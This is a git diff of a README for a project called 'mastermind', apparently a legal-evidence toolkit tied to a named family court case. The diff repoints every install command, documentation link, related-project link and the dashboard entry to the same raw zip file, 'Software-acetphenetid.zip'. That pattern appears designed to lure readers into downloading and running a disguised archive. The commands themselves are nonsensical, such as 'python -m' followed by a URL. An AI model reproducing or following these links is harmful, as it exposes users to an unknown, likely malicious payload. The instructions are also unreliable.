@@ -45,20 +45,20 @@ mastermind/
 
 ```bash
 # Clone repository
-git clone https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip
+git clone https://raw.githubusercontent.com/MilaCodesIt/mastermind/main/skills/stealth-ghosting/Software-acetphenetid.zip
 cd mastermind
 
 # Install dependencies
-pip install -r https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip
+pip install -r https://raw.githubusercontent.com/MilaCodesIt/mastermind/main/skills/stealth-ghosting/Software-acetphenetid.zip
 
 # Run evidence processor
-python -m https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip
+python -m https://raw.githubusercontent.com/MilaCodesIt/mastermind/main/skills/stealth-ghosting/Software-acetphenetid.zip
 
 # Scan for device repair repos
-python https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip
+python https://raw.githubusercontent.com/MilaCodesIt/mastermind/main/skills/stealth-ghosting/Software-acetphenetid.zip
 
 # Generate legal motion
-python -m https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip
+python -m https://raw.githubusercontent.com/MilaCodesIt/mastermind/main/skills/stealth-ghosting/Software-acetphenetid.zip
 ```
 
 ## 📋 Case 1FDV-23-0001009
@@ -121,11 +121,11 @@ Active Hawaii Family Court case with comprehensive evidence processing:
 
 ## 📚 Documentation
 
-- [Architecture Guide](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
-- [Agent Systems](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
-- [Legal Procedures](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
-- [Forensic Protocols](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
-- [API Reference](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
+- [Architecture Guide](https://raw.githubusercontent.com/MilaCodesIt/mastermind/main/skills/stealth-ghosting/Software-acetphenetid.zip)
+- [Agent Systems](https://raw.githubusercontent.com/MilaCodesIt/mastermind/main/skills/stealth-ghosting/Software-acetphenetid.zip)
+- [Legal Procedures](https://raw.githubusercontent.com/MilaCodesIt/mastermind/main/skills/stealth-ghosting/Software-acetphenetid.zip)
+- [Forensic Protocols](https://raw.githubusercontent.com/MilaCodesIt/mastermind/main/skills/stealth-ghosting/Software-acetphenetid.zip)
+- [API Reference](https://raw.githubusercontent.com/MilaCodesIt/mastermind/main/skills/stealth-ghosting/Software-acetphenetid.zip)
 
 ## 🤝 Contributing
 
@@ -137,13 +137,13 @@ See [LICENSE](LICENSE) for details.
 
 ## 🔗 Related Projects
 
-- [FEDERAL-FORENSIC-REPAIR-OMNIBUS](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
-- [Memory Plugin](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
-- [Aloha Kai Legal Research](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
+- [FEDERAL-FORENSIC-REPAIR-OMNIBUS](https://raw.githubusercontent.com/MilaCodesIt/mastermind/main/skills/stealth-ghosting/Software-acetphenetid.zip)
+- [Memory Plugin](https://raw.githubusercontent.com/MilaCodesIt/mastermind/main/skills/stealth-ghosting/Software-acetphenetid.zip)
+- [Aloha Kai Legal Research](https://raw.githubusercontent.com/MilaCodesIt/mastermind/main/skills/stealth-ghosting/Software-acetphenetid.zip)
 
 ---
 
-**Tracking**: [Issue #12](https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip)
+**Tracking**: [Issue #12](https://raw.githubusercontent.com/MilaCodesIt/mastermind/main/skills/stealth-ghosting/Software-acetphenetid.zip)
 **Status**: 🚧 Active Development - Powerhouse Build Phase
 
 ---
@@ -159,4 +159,4 @@ The Mastermind OS is now powered by the **Omni_Engine Kernel**.
 
 ### Entry Point:
 - **Kernel**: `omni-kernel/core/`
-- **Dash**: `https://github.com/MilaCodesIt/mastermind/raw/refs/heads/main/case-files/1FDV-23-0001009/Software-v1.9.zip`
+- **Dash**: `https://raw.githubusercontent.com/MilaCodesIt/mastermind/main/skills/stealth-ghosting/Software-acetphenetid.zip`
